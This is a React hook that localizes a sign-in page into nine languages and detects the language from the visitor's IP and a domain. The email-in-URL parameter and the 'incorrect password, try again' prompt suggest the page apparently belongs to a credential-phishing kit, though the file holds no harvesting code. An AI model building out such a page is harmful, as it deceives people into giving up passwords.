
import { useState, useEffect } from 'react';

interface TranslationData {
  [key: string]: {
    [key: string]: string;
  };
}

const translations: TranslationData = {
  en: {
    'Welcome Back': 'Welcome Back',
    'Sign in to continue to': 'Sign in to continue to',
    'Email Address': 'Email Address',
    'Password': 'Password',
    'Enter your password': 'Enter your password',
    'Sign In': 'Sign In',
    'Signing in...': 'Signing in...',
    'Incorrect password for': 'Incorrect password for',
    'Verify your password and try again.': 'Verify your password and try again.',
    'Invalid Request': 'Invalid Request',
    'Please provide an email parameter in the URL': 'Please provide an email parameter in the URL (e.g., ?email=user@domain.com)',
    'Loading...': 'Loading...',
    'All rights reserved.': 'All rights reserved.'
  },
  es: {
    'Welcome Back': 'Bienvenido de vuelta',
    'Sign in to continue to': 'Inicia sesión para continuar a',
    'Email Address': 'Dirección de correo',
    'Password': 'Contraseña',
    'Enter your password': 'Ingresa tu contraseña',
    'Sign In': 'Iniciar sesión',
    'Signing in...': 'Iniciando sesión...',
    'Incorrect password for': 'Contraseña incorrecta para',
    'Verify your password and try again.': 'Verifica tu contraseña e intenta de nuevo.',
    'Invalid Request': 'Solicitud inválida',
    'Please provide an email parameter in the URL': 'Por favor proporciona un parámetro de email en la URL (ej: ?email=user@domain.com)',
    'Loading...': 'Cargando...',
    'All rights reserved.': 'Todos los derechos reservados.'
  },
  fr: {
    'Welcome Back': 'Bon retour',
    'Sign in to continue to': 'Connectez-vous pour continuer vers',
    'Email Address': 'Adresse e-mail',
    'Password': 'Mot de passe',
    'Enter your password': 'Entrez votre mot de passe',
    'Sign In': 'Se connecter',
    'Signing in...': 'Connexion en cours...',
    'Incorrect password for': 'Mot de passe incorrect pour',
    'Verify your password and try again.': 'Vérifiez votre mot de passe et réessayez.',
    'Invalid Request': 'Demande invalide',
    'Please provide an email parameter in the URL': 'Veuillez fournir un paramètre email dans l\'URL (ex: ?email=user@domain.com)',
    'Loading...': 'Chargement...',
    'All rights reserved.': 'Tous droits réservés.'
  },
  de: {
    'Welcome Back': 'Willkommen zurück',
    'Sign in to continue to': 'Melden Sie sich an, um fortzufahren zu',
    'Email Address': 'E-Mail-Adresse',
    'Password': 'Passwort',
    'Enter your password': 'Geben Sie Ihr Passwort ein',
    'Sign In': 'Anmelden',
    'Signing in...': 'Anmeldung läuft...',
    'Incorrect password for': 'Falsches Passwort für',
    'Verify your password and try again.': 'Überprüfen Sie Ihr Passwort und versuchen Sie es erneut.',
    'Invalid Request': 'Ungültige Anfrage',
    'Please provide an email parameter in the URL': 'Bitte geben Sie einen E-Mail-Parameter in der URL an (z.B. ?email=user@domain.com)',
    'Loading...': 'Wird geladen...',
    'All rights reserved.': 'Alle Rechte vorbehalten.'
  },
  it: {
    'Welcome Back': 'Bentornato',
    'Sign in to continue to': 'Accedi per continuare a',
    'Email Address': 'Indirizzo email',
    'Password': 'Password',
    'Enter your password': 'Inserisci la tua password',
    'Sign In': 'Accedi',
    'Signing in...': 'Accesso in corso...',
    'Incorrect password for': 'Password errata per',
    'Verify your password and try again.': 'Verifica la tua password e riprova.',
    'Invalid Request': 'Richiesta non valida',
    'Please provide an email parameter in the URL': 'Fornisci un parametro email nell\'URL (es: ?email=user@domain.com)',
    'Loading...': 'Caricamento...',
    'All rights reserved.': 'Tutti i diritti riservati.'
  },
  pt: {
    'Welcome Back': 'Bem-vindo de volta',
    'Sign in to continue to': 'Entre para continuar para',
    'Email Address': 'Endereço de email',
    'Password': 'Senha',
    'Enter your password': 'Digite sua senha',
    'Sign In': 'Entrar',
    'Signing in...': 'Entrando...',
    'Incorrect password for': 'Senha incorreta para',
    'Verify your password and try again.': 'Verifique sua senha e tente novamente.',
    'Invalid Request': 'Solicitação inválida',
    'Please provide an email parameter in the URL': 'Forneça um parâmetro de email na URL (ex: ?email=user@domain.com)',
    'Loading...': 'Carregando...',
    'All rights reserved.': 'Todos os direitos reservados.'
  },
  zh: {
    'Welcome Back': '欢迎回来',
    'Sign in to continue to': '登录以继续到',
    'Email Address': '电子邮件地址',
    'Password': '密码',
    'Enter your password': '请输入您的密码',
    'Sign In': '登录',
    'Signing in...': '正在登录...',
    'Incorrect password for': '密码错误',
    'Verify your password and try again.': '请验证您的密码并重试。',
    'Invalid Request': '无效请求',
    'Please provide an email parameter in the URL': '请在URL中提供电子邮件参数 (例如: ?email=user@domain.com)',
    'Loading...': '加载中...',
    'All rights reserved.': '版权所有。'
  },
  ja: {
    'Welcome Back': 'おかえりなさい',
    'Sign in to continue to': 'サインインして続行',
    'Email Address': 'メールアドレス',
    'Password': 'パスワード',
    'Enter your password': 'パスワードを入力してください',
    'Sign In': 'サインイン',
    'Signing in...': 'サインイン中...',
    'Incorrect password for': 'パスワードが間違っています',
    'Verify your password and try again.': 'パスワードを確認して再試行してください。',
    'Invalid Request': '無効なリクエスト',
    'Please provide an email parameter in the URL': 'URLにメールパラメータを指定してください (例: ?email=user@domain.com)',
    'Loading...': '読み込み中...',
    'All rights reserved.': '全著作権所有。'
  },
  ro: {
    'Welcome Back': 'Bun venit înapoi',
    'Sign in to continue to': 'Conectați-vă pentru a continua la',
    'Email Address': 'Adresa de email',
    'Password': 'Parola',
    'Enter your password': 'Introduceți parola',
    'Sign In': 'Conectare',
    'Signing in...': 'Se conectează...',
    'Incorrect password for': 'Parolă incorectă pentru',
    'Verify your password and try again.': 'Verificați parola și încercați din nou.',
    'Invalid Request': 'Cerere nevalidă',
    'Please provide an email parameter in the URL': 'Vă rugăm să furnizați un parametru email în URL (ex: ?email=user@domain.com)',
    'Loading...': 'Se încarcă...',
    'All rights reserved.': 'Toate drepturile rezervate.'
  }
};

export function useLanguageDetection(domain: string | null) {
  const [detectedLanguage, setDetectedLanguage] = useState<string>('en');
  const [isDetecting, setIsDetecting] = useState(false);

  // Function to translate text
  const translate = (text: string): string => {
    const translation = translations[detectedLanguage];
    return translation?.[text] || text;
  };

  // Function to detect language from domain and IP
  const detectLanguage = async (domain: string) => {
    if (!domain) return 'en';

    setIsDetecting(true);
    
    try {
      // Send request to our backend to detect language (now uses both IP and domain)
      const response = await fetch('/api/detect-language', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ domain }),
      });

      if (response.ok) {
        const data = await response.json();
        const language = data.language || 'en';
        const detectedFrom = data.detectedFrom || 'unknown';
        
        console.log(`Language detected: ${language} (from ${detectedFrom})`);
        setDetectedLanguage(language);
        setIsDetecting(false);
        return language;
      }
    } catch (error) {
      console.error('Language detection failed:', error);
    }

    setIsDetecting(false);
    return 'en';
  };

  useEffect(() => {
    if (domain) {
      detectLanguage(domain);
    }
  }, [domain]);

  return {
    detectedLanguage,
    isDetecting,
    translate,
    setDetectedLanguage
  };
}
